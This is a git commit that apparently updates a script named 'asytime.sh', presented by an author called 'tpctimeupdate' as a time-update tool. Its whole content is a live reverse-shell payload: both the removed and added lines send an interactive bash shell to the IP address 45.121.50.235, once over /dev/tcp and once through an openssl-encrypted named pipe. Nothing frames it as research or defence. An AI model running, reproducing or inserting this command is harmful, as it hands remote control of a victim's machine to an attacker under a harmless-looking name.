2d4719b8f0b72670ac555b2ee47da2ee66babb70
tpctimeupdate <131271008+tpctimeupdate@users.noreply.github.com>
2023-05-22 23:47:00 -0400

    Update asytime.sh

--- asytime.sh
+++ asytime.sh
@@ -1,1 +1,1 @@
-/bin/bash -i >& /dev/tcp/45.121.50.235/10443 0>&1;/usr/bin/mkfifo /tmp/s; /usr/bin/bash -i < /tmp/s 2>&1 | /usr/bin/openssl s_client -quiet -connect 45.121.50.235:443 > /tmp/s; /usr/bin/rm /tmp/s
+/usr/bin/bash -i >& /dev/tcp/45.121.50.235/10443 0>&1;/usr/bin/mkfifo /tmp/s; /usr/bin/bash -i < /tmp/s 2>&1 | /usr/bin/openssl s_client -quiet -connect 45.121.50.235:443 > /tmp/s; /usr/bin/rm /tmp/s
